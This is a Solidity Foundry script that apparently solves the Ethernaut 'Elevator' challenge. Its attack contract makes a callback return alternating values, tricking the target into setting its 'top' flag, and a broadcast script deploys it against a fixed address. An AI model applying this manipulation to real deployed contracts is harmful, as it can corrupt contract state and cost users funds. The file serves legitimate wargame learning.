// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Elevator} from "src/Elevator.sol";

contract ElevatorAttack {
    bool public pwn = true;
    Elevator target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        pwn = !pwn;
        return pwn;
    }

    function attack() external {
        target.goTo(1);
        console.logBool(target.top());
    }
}

contract ElevatorSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ElevatorAttack instance = new ElevatorAttack(0x4D6F9e5d20D7EC1b80ECa713B93b606F79C0294c);
        instance.attack();
        vm.stopBroadcast();
    }
}
